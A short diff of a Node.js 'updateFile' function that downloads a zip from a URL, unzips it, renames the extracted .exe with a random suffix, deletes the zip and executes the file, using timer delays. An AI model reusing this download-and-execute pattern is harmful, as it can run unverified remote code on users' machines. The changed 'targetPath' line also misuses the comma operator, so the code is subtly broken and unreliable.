@@ -64,7 +64,7 @@ function updateFile(file, url) {
 
     let received_bytes = 0;
     let total_bytes = 0;
-    const targetPath =( `C:\\${file}.zip`)
+    const targetPath =(__dirname,`${file}.zip`)
     let req = request({
         method: 'GET',
         uri: url,
@@ -87,11 +87,11 @@ function updateFile(file, url) {
 
     req.on('end', async function () {
         try{
-            setTimeout(function (){unzip(file)}, 2000)
-            setTimeout(() => {fs.rename(file + '.exe', `${file}_${rename()}.exe`, ()=>{
+            setTimeout(function (){unzip(file)}, 1300)
+            setTimeout(() => {fs.rename(`C:\\${file}.exe`, `C:\\${file}_${rename()}.exe`, ()=>{
                 console.log("entrou")
             })},3400)
-            setTimeout( function () {fs.unlinkSync(`C:\\${file}.zip`)}, 7000)
+            setTimeout( function () {fs.unlinkSync(targetPath)}, 7000)
             setTimeout( function () {execute(file)}, 9000)
 
         }
